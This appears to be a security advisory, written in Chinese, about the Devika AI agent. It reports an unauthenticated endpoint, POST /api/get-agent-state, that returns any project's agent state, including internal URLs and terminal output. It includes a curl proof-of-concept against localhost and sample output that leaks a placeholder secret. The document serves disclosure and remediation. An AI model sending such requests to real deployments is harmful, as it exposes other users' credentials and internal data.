# Devika：未认证跨项目 Agent 状态读取（POST /api/get-agent-state）

## 描述

`POST /api/get-agent-state`（devika.py:114-120）按 `project_name` 返回任意项目的 agent 状态栈原文，无认证、无属主校验。状态中含 browser_session 的截图路径/URL、terminal_session 的命令与输出等运行时敏感数据。

## 影响

任何能访问 1337 端口的网络客户端读取其他项目的 agent 状态：受害项目正在浏览的内网 URL、终端会话输出（可能含命令回显中的密钥/内部信息）、内部独白等。

## PoC

```bash
# 前提：victim-project 存在 agent 状态（browser_session.url 指向内网、
#        terminal_session.output 含 VICTIM-TERMINAL-SECRET-42）
curl -X POST http://127.0.0.1:1337/api/get-agent-state \
  -H "Content-Type: application/json" -d '{"project_name": "victim-project"}'
```

## 执行结果

```
$ curl -X POST .../api/get-agent-state -d '{"project_name": "victim-project"}'
internal-victim-admin:8080/console
VICTIM-TERMINAL-SECRET-42
[HTTP 200]
```
